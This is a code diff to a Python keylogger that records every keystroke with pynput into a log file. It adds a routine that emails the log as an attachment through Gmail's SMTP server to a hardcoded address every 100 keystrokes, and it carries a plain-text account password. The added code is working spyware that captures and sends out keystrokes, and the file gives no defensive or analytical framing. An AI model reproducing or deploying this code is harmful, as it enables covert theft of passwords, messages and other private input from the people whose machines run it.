@@ -2,15 +2,76 @@ import logging
 #listening for 
 from pynput.keyboard import Key, Listener
 
+# relevant librarires for exfil via email
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+# email stuffs
+email_address = "testingtemp568@gmail.com"
+password = "gwms hvfz hnga gazm" 
+# password = "gwmshvfzhngagazm" 
+toaddr = "testingtemp568@gmail.com" 
 
 #make a log file
-log_dir = ""
+log_dir = "key_log.txt"
 
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+extend = "\\"
+file_merge = log_dir + extend
 
+# exfil via email to testing gmail account
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = email_address
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
+    body = "see attached"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+# send_email(log_dir, log_dir, toaddr)
+
+logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+count = 0
+
+# send email every 100 keystrokes
 def on_press(key):
-    print("hi this is key")
     logging.info(str(key))
+    global count
+    count += 1
+    if count == 100:
+        send_email(log_dir, log_dir, toaddr)
+        count = 0
     if key == Key.esc:
         return False
 
